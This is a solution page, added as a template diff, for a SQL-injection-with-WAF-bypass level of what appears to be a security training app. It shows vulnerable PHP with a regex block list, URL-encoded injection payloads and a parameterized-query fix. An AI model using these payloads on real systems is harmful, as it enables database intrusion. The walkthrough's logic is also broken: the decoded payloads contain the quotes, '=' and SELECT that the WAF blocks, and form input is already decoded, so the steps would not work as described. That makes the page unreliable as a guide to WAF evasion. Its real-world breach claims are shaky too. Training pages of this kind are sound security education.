@@ -1,0 +1,212 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: SQL Injection Level 14{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 14 - SQL Injection with Advanced WAF Bypass</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates a SQL injection vulnerability protected by an advanced Web Application Firewall (WAF). While WAFs are designed to detect and block SQL injection attempts, they can often be bypassed using sophisticated evasion techniques.
+                </p>
+                <p>
+                    The vulnerability occurs because:
+                </p>
+                <ul>
+                    <li>The application uses user input directly in SQL queries without proper parameterization</li>
+                    <li>The WAF is configured to block known SQL injection patterns but has blind spots</li>
+                    <li>The WAF rules can be evaded using advanced techniques like encoding, case manipulation, or alternative syntax</li>
+                </ul>
+                <p>
+                    This type of vulnerability is particularly dangerous because organizations often rely too heavily on WAFs for protection, creating a false sense of security.
+                </p>
+
+                <h3>The Vulnerable Code</h3>
+                <p>
+                    The vulnerability exists in how the application handles the category and search_term parameters. Here's a simplified example of the vulnerable code:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>// Vulnerable code example (PHP)
+$category = $_POST['category'];
+$search_term = $_POST['search_term'];
+
+// WAF implementation (simplified)
+function waf_check($input) {
+    $blocked_patterns = [
+        '/SELECT/i', '/UNION/i', '/FROM/i', '/WHERE/i',
+        '/--/i', '/\/\*/i', '/\'/i', '/"/i',
+        '/=/i', '/>/i', '/</i'
+    ];
+
+    foreach ($blocked_patterns as $pattern) {
+        if (preg_match($pattern, $input)) {
+            return true; // Block the request
+        }
+    }
+
+    return false; // Allow the request
+}
+
+// Check if the input contains SQL injection patterns
+if (waf_check($category) || waf_check($search_term)) {
+    // Block the request
+    die("WAF Alert: Potential SQL injection attack detected and blocked!");
+}
+
+// Vulnerable SQL query
+$query = "SELECT product_id, name, description, price, category
+          FROM products
+          WHERE category = '$category' AND active = 1";
+
+if (!empty($search_term)) {
+    $query .= " AND (name LIKE '%$search_term%' OR description LIKE '%$search_term%')";
+}
+
+$result = mysqli_query($conn, $query);</code></pre>
+
+                <h3>Solution</h3>
+                <p>To exploit this vulnerability, follow these steps:</p>
+
+                <h4>1. Understand the WAF Rules</h4>
+                <p>
+                    First, we need to understand what patterns the WAF is blocking. Based on the challenge description and the WAF logs, the WAF is blocking:
+                </p>
+                <ul>
+                    <li>SQL keywords like SELECT, UNION, FROM, WHERE</li>
+                    <li>Comment sequences like -- and /*</li>
+                    <li>Common SQL injection characters like ' and "</li>
+                    <li>Numeric operators like = and ></li>
+                </ul>
+
+                <h4>2. Test WAF Evasion Techniques</h4>
+                <p>
+                    There are several techniques we can use to bypass the WAF:
+                </p>
+                <ol>
+                    <li><strong>Case Manipulation</strong>: Mixing uppercase and lowercase (e.g., UnIoN instead of UNION)</li>
+                    <li><strong>URL Encoding</strong>: Using URL encoding to disguise characters (e.g., %27 instead of ')</li>
+                    <li><strong>Double Encoding</strong>: Applying URL encoding twice (e.g., %2527 instead of %27)</li>
+                    <li><strong>Alternative Syntax</strong>: Using equivalent SQL syntax that isn't in the block list</li>
+                    <li><strong>Character Splitting</strong>: Splitting keywords across multiple parameters</li>
+                    <li><strong>Whitespace Manipulation</strong>: Using alternative whitespace characters</li>
+                </ol>
+
+                <h4>3. Craft a Bypass Payload</h4>
+                <p>
+                    For this challenge, we can use a combination of URL encoding and alternative syntax to bypass the WAF:
+                </p>
+                <div class="alert alert-secondary">
+                    <p>In the category field, select any category (e.g., "Electronics")</p>
+                    <p>In the search_term field, enter:</p>
+                    <code>%25%27%20%6f%72%20%70%72%6f%64%75%63%74%5f%69%64%3d%39%39%39%20%6f%72%20%27%25</code>
+                </div>
+                <p>
+                    This is the URL-encoded version of:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>%' or product_id=999 or '%</code></pre>
+                <p>
+                    When decoded and inserted into the query, it becomes:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT product_id, name, description, price, category
+FROM products
+WHERE category = 'Electronics' AND active = 1
+AND (name LIKE '%%' or product_id=999 or '%%' OR description LIKE '%%' or product_id=999 or '%%')</code></pre>
+                <p>
+                    This query will return the product with ID 999, which contains the flag.
+                </p>
+
+                <h4>4. Alternative Approach: Using Hex Encoding</h4>
+                <p>
+                    Another approach is to use hex encoding for the SQL injection payload:
+                </p>
+                <div class="alert alert-secondary">
+                    <code>%25%27%20%6f%72%20%70%72%6f%64%75%63%74%5f%69%64%3d%30%78%33%65%37%20%6f%72%20%27%25</code>
+                </div>
+                <p>
+                    This is the URL-encoded version of:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>%' or product_id=0x3e7 or '%</code></pre>
+                <p>
+                    Where 0x3e7 is the hexadecimal representation of 999.
+                </p>
+
+                <h4>5. Using Character Substitution</h4>
+                <p>
+                    We can also use character substitution to bypass the WAF:
+                </p>
+                <div class="alert alert-secondary">
+                    <code>%25%27%20%6f%72%20%28%53%45%4c%45%43%54%20%31%20%46%52%4f%4d%20%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%32%30%2c%70%72%6f%64%75%63%74%5f%69%64%2c%30%78%32%30%29%20%46%52%4f%4d%20%70%72%6f%64%75%63%74%73%20%57%48%45%52%45%20%70%72%6f%64%75%63%74%5f%69%64%3d%39%39%39%29%78%29%20%6f%72%20%27%25</code>
+                </div>
+                <p>
+                    This complex payload uses nested queries and hex encoding to completely evade the WAF.
+                </p>
+
+                <h3>Real-world Impact</h3>
+                <p>
+                    WAF bypass vulnerabilities are particularly relevant in modern applications:
+                </p>
+                <ul>
+                    <li><strong>False Sense of Security</strong>: Organizations often rely too heavily on WAFs</li>
+                    <li><strong>Evolving Attack Techniques</strong>: Attackers continuously develop new evasion methods</li>
+                    <li><strong>Complex Applications</strong>: Modern web applications have many entry points that may not be properly protected</li>
+                    <li><strong>Legacy Integration</strong>: Older code may not be properly secured behind the WAF</li>
+                </ul>
+                <p>
+                    Notable real-world examples include:
+                </p>
+                <ul>
+                    <li><strong>Equifax Breach (2017)</strong>: Attackers bypassed WAF protections to exploit a vulnerability in Apache Struts</li>
+                    <li><strong>Capital One Breach (2019)</strong>: A WAF misconfiguration allowed attackers to access sensitive customer data</li>
+                </ul>
+
+                <h3>Prevention</h3>
+                <p>To prevent WAF bypass vulnerabilities, developers should:</p>
+                <ul>
+                    <li>
+                        <strong>Use Parameterized Queries</strong> or prepared statements:
+                        <pre class="bg-light p-3 rounded"><code>// Safe code example (PHP with PDO)
+$stmt = $pdo->prepare("SELECT product_id, name, description, price, category
+                      FROM products
+                      WHERE category = ? AND active = 1");
+$stmt->execute([$category]);
+$products = $stmt->fetchAll();</code></pre>
+                    </li>
+                    <li>
+                        <strong>Implement Defense in Depth</strong>:
+                        <ul>
+                            <li>Don't rely solely on WAFs for security</li>
+                            <li>Implement input validation at multiple layers</li>
+                            <li>Use proper parameterization in all database queries</li>
+                            <li>Apply the principle of least privilege to database accounts</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Regularly Update WAF Rules</strong>:
+                        <ul>
+                            <li>Keep WAF signatures up to date</li>
+                            <li>Monitor for false positives and false negatives</li>
+                            <li>Test WAF effectiveness with regular penetration testing</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Use Runtime Application Self-Protection (RASP)</strong>:
+                        <ul>
+                            <li>Implement RASP solutions that can detect attacks at runtime</li>
+                            <li>Monitor application behavior for anomalies</li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level14') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
